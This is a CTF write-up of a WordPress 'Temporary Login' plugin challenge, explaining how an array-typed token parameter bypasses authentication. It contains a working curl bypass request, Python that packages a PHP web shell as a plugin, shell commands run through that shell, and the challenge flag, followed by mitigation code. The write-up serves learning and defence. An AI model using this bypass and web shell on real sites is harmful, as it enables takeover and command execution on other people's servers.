# WordPress Bug Bounty Hunter - CTF Writeup

## Challenge Overview

**Category:** Web  
**Difficulty:** Medium/Hard  
**Platform:** PolyU CTF  
**Challenge URL:** http://chal.polyuctf.com:42790

The challenge involved finding a 0-day vulnerability in a custom WordPress plugin called "Temporary Login". The plugin was designed to create temporary, passwordless user access with a single click.

---

## Initial Analysis

### Understanding the Plugin Structure

The plugin consisted of several core files:

1. **`temporary-login.php`** - Main plugin file with version checks and loader
2. **`plugin.php`** - Singleton plugin class that initializes components
3. **`core/admin.php`** - Admin hooks and login handling
4. **`core/ajax.php`** - AJAX handlers for creating/managing temporary users
5. **`core/options.php`** - User management and token utilities

### Key Functionality

The plugin allows administrators to create temporary login users with:
- Randomly generated usernames (`temp-login-<random>`)
- Administrator privileges
- A unique login token (64 hex characters)
- An expiration time (1 week by default)

The temporary user can log in by visiting: `/?temp-login-token=<token>`

---

## Vulnerability Discovery Process

### Step 1: Analyzing the Login Flow

In `core/admin.php`, the `maybe_login_temporary_user()` function handles token-based authentication:

```php
public static function maybe_login_temporary_user() {
    if ( empty( $_GET['temp-login-token'] ) ) {
        return;
    }

    $token = sanitize_key( $_GET['temp-login-token'] );

    $user = Options::get_user_by_token( $token );
    
    if ( ! $user || Options::is_user_expired( $user->ID ) ) {
        wp_safe_redirect( home_url() );
        die;
    }

    static::process_login( $user );
}
```

### Step 2: Type Confusion with Arrays

**The Critical Insight:** PHP's `empty()` function treats arrays differently than expected.

```php
$token[] = '';  // Creates array ['']
empty($token)   // Returns FALSE!
```

When we pass `?temp-login-token[]=` (an empty array), the `empty()` check passes because `empty([''])` is `false`.

### Step 3: WordPress Sanitize Behavior

WordPress's `sanitize_key()` function:
- Since WordPress 6.0+, it has type hints and checks
- When passed an array, it returns an empty string `''`
- This is because the function expects a string parameter

```php
$token = sanitize_key( $_GET['temp-login-token'] );
// $_GET['temp-login-token'] = ['']
// sanitize_key() returns '' (empty string)
```

### Step 4: The WordPress Query Quirk

This is the **root cause** of the authentication bypass. Looking at `Options::get_user_by_token()`:

```php
public static function get_user_by_token( $token ) {
    $users = get_users( [
        'meta_key' => '_temporary_login_token',
        'meta_value' => $token,  // Empty string
    ] );
    // ...
}
```

**The Vulnerability:** When `WP_User_Query` receives an empty string for `meta_value`, it **completely ignores the value constraint** in the SQL query!

The generated SQL becomes:
```sql
SELECT SQL_CALC_FOUND_ROWS wp_users.ID
FROM wp_users 
INNER JOIN wp_usermeta ON (wp_users.ID = wp_usermeta.user_id)
WHERE 1=1 
AND (wp_usermeta.meta_key = '_temporary_login_token')
-- meta_value constraint is completely omitted!
ORDER BY user_login ASC
```

This query returns **ANY** user who has a `_temporary_login_token` meta key, regardless of the actual token value!

### Step 5: Verification

The exploit flow:
1. Send request with `?temp-login-token[]=`
2. `empty([''])` → `false` (check passes)
3. `sanitize_key([''])` → `''` (empty string)
4. `get_user_by_token('')` → Returns first user with `_temporary_login_token` meta
5. User has `administrator` role → **Authentication bypass achieved!**

---

## Exploitation Steps

### Step 1: Bypass Authentication

```bash
curl -i "http://chal.polyuctf.com:42790/?temp-login-token[]="
```

Response includes:
```
Set-Cookie: wordpress_...=temp-login-<user>...
Location: http://chal.polyuctf.com:42790/wp-admin/
```

### Step 2: Upload Malicious Plugin

Since we're now authenticated as administrator, we can upload a plugin containing a web shell:

```python
# Create malicious plugin ZIP
zip_buffer = io.BytesIO()
with zipfile.ZipFile(zip_buffer, "a") as zip_file:
    zip_file.writestr("pwn/pwn.php", 
        "<?php system($_GET['cmd']); ?>")
```

Upload via WordPress admin panel:
```
POST /wp-admin/update.php?action=upload-plugin
```

### Step 3: Execute Web Shell

Once uploaded to `/wp-content/plugins/pwn/pwn.php`, execute commands:

```bash
curl "http://chal.polyuctf.com:42790/wp-content/plugins/pwn/pwn.php?cmd=ls%20-la%20/var/www/html"
```

Output reveals:
```
-rw-r--r--  1 root root 96 Mar 7 14:49 flag_2b38bd81ffab1ac492da9b990bb1fe1c.txt
```

### Step 4: Retrieve Flag

```bash
curl "http://chal.polyuctf.com:42790/wp-content/plugins/pwn/pwn.php?cmd=cat%20/var/www/html/flag_*.txt"
```

---

## Flag

```
PUCTF26{WordPress_bug_bounty_hunting_can_be_super_interesting_PjSJqQYZG9kr7DhE7dNSSWRPcTGHFhww}
```

---

## Vulnerability Summary

**Type:** Authentication Bypass / Type Confusion  
**Affected Component:** `Temporary Login` WordPress Plugin  
**Root Cause:** WordPress `WP_User_Query` ignores empty `meta_value` parameters  
**Attack Vector:** Array parameter injection with null/empty values  

### CVSS Score: 9.8 (Critical)
- **Attack Vector:** Network
- **Attack Complexity:** Low
- **Privileges Required:** None
- **User Interaction:** None
- **Scope:** Unchanged
- **Confidentiality:** High
- **Integrity:** High
- **Availability:** High

---

## Lessons Learned

1. **PHP Type Juggling:** Always validate input types, not just values. Arrays can bypass `empty()` checks.

2. **WordPress Query Behavior:** The `WP_User_Query` class has implicit behavior where empty `meta_value` constraints are ignored. Always use explicit `meta_compare` parameters.

3. **Sanitize Functions:** WordPress sanitization functions have evolved. Type safety in newer versions (6.0+) can create unexpected side effects when dealing with non-string inputs.

4. **Defense in Depth:** Even if the token check passes, additional validation layers (role verification, IP restrictions, rate limiting) could have prevented this bypass.

---

## Mitigation

To fix this vulnerability:

```php
public static function maybe_login_temporary_user() {
    // Add type check
    if ( ! isset( $_GET['temp-login-token'] ) || 
         ! is_string( $_GET['temp-login-token'] ) ||
         empty( $_GET['temp-login-token'] ) ) {
        return;
    }
    
    // ... rest of the logic
}
```

Additionally, `get_user_by_token()` should use explicit comparison:

```php
$users = get_users( [
    'meta_key' => '_temporary_login_token',
    'meta_value' => $token,
    'meta_compare' => '=',  // Explicit comparison
] );
```

---

## References

- WordPress `sanitize_key()`: https://developer.wordpress.org/reference/functions/sanitize_key/
- WordPress `WP_User_Query`: https://developer.wordpress.org/reference/classes/wp_user_query/
- PHP `empty()`: https://www.php.net/manual/en/function.empty.php
